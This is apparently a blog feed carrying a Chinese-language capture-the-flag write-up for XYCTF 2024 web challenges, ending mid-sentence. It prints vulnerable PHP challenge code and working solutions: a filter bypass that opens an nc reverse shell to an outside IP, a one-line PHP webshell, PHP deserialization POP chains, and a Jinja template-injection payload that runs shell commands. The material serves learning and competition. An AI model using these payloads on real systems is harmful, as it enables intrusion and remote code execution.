<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NaCl&#39;s Blog</title>
  
  <subtitle>hi</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-04-28T06:53:23.032Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>NaCl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XYCTF 2024 Web</title>
    <link href="http://example.com/2024/04/28/XYCTF-2024-Web/"/>
    <id>http://example.com/2024/04/28/XYCTF-2024-Web/</id>
    <published>2024-04-28T06:51:55.000Z</published>
    <updated>2024-04-28T06:53:23.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF-2024-Web"><a href="#XYCTF-2024-Web" class="headerlink" title="XYCTF 2024 Web"></a>XYCTF 2024 Web</h1><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>略</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>略</p><h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>相同md5图片, 一搜就有, 略</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先要添加一个<code>%0a</code>让代码不被#注释, 然后用<code>%23</code>再把,manba out注释掉</p><p>$(which sh)代替bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23</span><br><span class="line">&amp;1=nc 107.148.75.202 1234 -e $(which sh)</span><br></pre></td></tr></table></figure><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a><strong>ezMake</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php if(eval($$_POST[1])) ?&gt;&#x27; &gt; a.php</span><br></pre></td></tr></table></figure><h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a><strong>ez?Make</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 107.148.75.202 1234  -e `which sh`</span><br></pre></td></tr></table></figure><h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;win&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = [<span class="number">1</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><p>配合fast-destruct</p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>admin密码: asdqwe</p><p>找catch_warnings</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xyctf.top:36318/index&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZgzePQ.xovem1N0fv78Nth8E0_iXRxY7UA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&#x27;?sentence=你好()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(&#123;&#125;)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = url + sentence</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">    res = requests.get(url=payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)), headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;found catch_warnings is in &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;出现了一点小问题&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#found catch_warnings is in 221</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sentence=你好()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(221)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)</span><br><span class="line">&amp;x1=__class__</span><br><span class="line">&amp;x2=__base__</span><br><span class="line">&amp;x3=__subclasses__</span><br><span class="line">&amp;x4=__getitem__</span><br><span class="line">&amp;x5=__init__</span><br><span class="line">&amp;x6=__globals__</span><br><span class="line">&amp;x7=__builtins__</span><br><span class="line">&amp;x8=eval</span><br><span class="line">&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>没什么好说的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;password = &amp;<span class="variable">$nacl</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd_char</span>) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;foreach&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>$0为当前运行的脚本(即bash), 然后用八进制ascii传入cat 